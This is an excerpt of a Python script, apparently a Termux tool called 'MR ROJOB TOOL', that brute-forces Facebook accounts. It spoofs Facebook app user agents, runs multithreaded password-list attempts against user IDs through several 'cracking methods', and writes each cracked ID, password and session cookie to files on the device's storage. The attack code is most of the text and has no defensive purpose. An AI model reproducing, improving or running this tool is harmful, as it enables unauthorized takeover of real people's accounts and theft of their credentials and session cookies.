...
print("\x1b[38;5;46m➤\x1b[1;97m MR ROJOB TOOL ")   
sim_id = ''
...
myweb2 = requests.get("https://github.com/SKBER-CYBER/Contol/blob/main/ROJOB").text
def apv():
	try:
		clear()
		x = requests.get("https://github.com/SKBER-CYBER/Contol/blob/main/ROJOB").text
...
def ____ua____():
	...
	ua4 = f'[FBAN/Orca-Android;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+f';[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/'+'{density=2.25,width=720,height=1280}'+f';FBLC/it_IT;FBRV/256855919;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
...
logo=f"""{A}
    ROJOB ALI❤️‍🩹❤️‍🩹❤️‍🩹  \x1b[38;5;46mV/1.0
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;46m➤{A} FACEBOOK     {R}:{A} ROJOB AL
\x1b[38;5;46m➤{A} GITHUB       {R}:{A} PINIK WORLD
...
def Main():
        try:
                        ...
                        linex()
                        ROJOB=input(f'\x1b[38;5;46m➤{A} CHOICE {R}: {G}')
                        if ROJOB in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(f"\x1b[38;5;46m➤{A} USER NAME    {R}:{G} {username}");print(f"\x1b[38;5;46m➤{A} KEY {R}:{G} {kex}");linex();print(f'\x1b[38;5;46m➤{A} CRACKING METHOD {R}:{G} M{mthd}')
                                ...
                                os.system('xdg-open https://www.facebook.com/ROJOBfire');menu()
                        elif ROJOB in ['0','00']:
...
def api1(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}ROJOB-M1{A}] {A}<[{R}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]>");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\x1b[38;5;46m➤➤ {A}[{G}ROJOB-OK{A}]{G} '+ids+f' | '+pas+'')
                open('/sdcard/ROJOB-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r➤➤{R}[ROJOB-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/ROJOB-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def api2(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}ROJOB-M2{A}|{X3}{date}{A}|{BU}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r\x1b[38;5;46m➤➤ ALAMIM-OK '+ids+f' | '+pas+' | '+coki+'')
                open('/sdcard/ROJOB-FILE-M2-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r➤➤ {R}[ROJOB-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/ROJOB-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
        ...
        pass
#_____________| File Method3 |_____________#
def api3(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}ROJOB-M3{A}|{X3}{date}{A}|{BU}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r\x1b[38;5;46m➤➤ {A}[{G}ROJOB-OK{A}]{G} '+ids+f'|'+pas+'')
                open('/sdcard/ROJOB-FILE-M3-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}➤➤ ROJOB-CP{R} '+ids+f' | '+pas+'')
                open('/sdcard/ROJOB-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
#_____________|RND Method |_____________#
def __API__(ids,passlist,tl,ck):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}ROJOB-RN{A}|{X3}{date}{A}|{BU}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]");sys.stdout.flush()
    ...
    try:
        for pas in passlist:
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Photoshop' in res:
                    if "Y" in ck:
                        print(f'\r\rx1b[38;5;46m➤ OK {cid} | {pas} | {coki} ');linex()
                        open('/sdcard/ROJOB-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ROJOB-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
                    else:
                        print(f'\r\rx1b[38;5;46m➤ OK {A}[{G}ROJOB-OK{A}]{G} {cid} | {pas} ')
                        open('/sdcard/ROJOB-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ROJOB-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break 
            else:
